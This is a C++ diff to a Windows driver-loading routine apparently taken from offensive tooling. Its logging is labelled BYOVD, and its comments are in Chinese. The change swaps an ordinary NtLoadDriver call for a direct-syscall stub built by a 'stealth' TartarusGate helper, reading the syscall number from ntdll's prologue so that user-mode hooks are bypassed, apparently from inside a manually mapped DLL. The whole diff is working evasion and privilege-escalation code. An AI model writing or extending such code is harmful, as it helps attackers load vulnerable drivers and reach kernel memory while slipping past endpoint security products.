@@ -26,6 +26,7 @@
 #include <cstdarg>
 #include <Psapi.h>
 #include <shlobj.h>
+#include "syscall_direct.h"  // ★ BUILD 484: TartarusGate::GenerateSyscallStub for NtLoadDriver
 #ifdef _MSC_VER
 #include <intrin.h>
 #endif
@@ -931,13 +932,11 @@ bool KernelMemoryAccessor::LoadDriver(const std::wstring& serviceName,
     ByovdDiag("BYOVD:LoadDriver: ImagePath=%ls\n", ntPath);
     RegCloseKey(hKey);
 
-    // 调用 NtLoadDriver (走 syscall 更安全, 但这里用直接调用)
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    if (!ntdll) return false;
-
-    using NtLoadDriver_t = NTSTATUS(NTAPI*)(PUNICODE_STRING);
-    auto pNtLoadDriver = (NtLoadDriver_t)GetProcAddress(ntdll, "NtLoadDriver");
-    if (!pNtLoadDriver) return false;
+    // ★ BUILD 484: 使用直接 syscall stub 绕过 ntdll 包装
+    //   在 manual-mapped DLL 上下文中, 通过 GetProcAddress 调用 NtLoadDriver 
+    //   会触发 ntdll 内部架构 (CFG/影子栈/内部数据依赖), 导致 ACCESS_VIOLATION
+    //   改用 TartarusGate::GenerateSyscallStub 生成纯 syscall 指令,
+    //   跳过所有 ntdll 包装逻辑
 
     std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + serviceName;
     UNICODE_STRING us;
@@ -945,8 +944,38 @@ bool KernelMemoryAccessor::LoadDriver(const std::wstring& serviceName,
     us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
     us.MaximumLength = us.Length + sizeof(wchar_t);
 
+    DWORD ntLoadDriverSsn = 0;
+    {
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtdll) {
+            auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(hNtdll, "NtLoadDriver"));
+            if (funcAddr && funcAddr[0] == 0x4C && funcAddr[1] == 0x8B &&
+                funcAddr[2] == 0xD1 && funcAddr[3] == 0xB8) {
+                ntLoadDriverSsn = *reinterpret_cast<DWORD*>(funcAddr + 4);
+            }
+        }
+    }
+    if (!ntLoadDriverSsn) {
+        ByovdDiag("BYOVD:LoadDriver: failed to extract NtLoadDriver SSN\n");
+        return false;
+    }
+    ByovdDiag("BYOVD:LoadDriver: NtLoadDriver SSN=0x%X\n", ntLoadDriverSsn);
+
+    void* syscallStub = stealth::TartarusGate::GenerateSyscallStub(ntLoadDriverSsn);
+    if (!syscallStub) {
+        ByovdDiag("BYOVD:LoadDriver: GenerateSyscallStub failed\n");
+        return false;
+    }
+
+    using NtLoadDriverFn = NTSTATUS(NTAPI*)(PUNICODE_STRING);
+    auto pNtLoadDriver = reinterpret_cast<NtLoadDriverFn>(syscallStub);
+
     NTSTATUS status = pNtLoadDriver(&us);
-    ByovdDiag("BYOVD:LoadDriver: NtLoadDriver → 0x%08X\n", status);
+    ByovdDiag("BYOVD:LoadDriver: NtLoadDriver(syscall) → 0x%08X\n", status);
+
+    // 释放 stub 内存
+    VirtualFree(syscallStub, 0, MEM_RELEASE);
+    
     // STATUS_IMAGE_ALREADY_LOADED (0xC000010E) 也是成功
     return NT_SUCCESS(status) || status == 0xC000010E;
 }
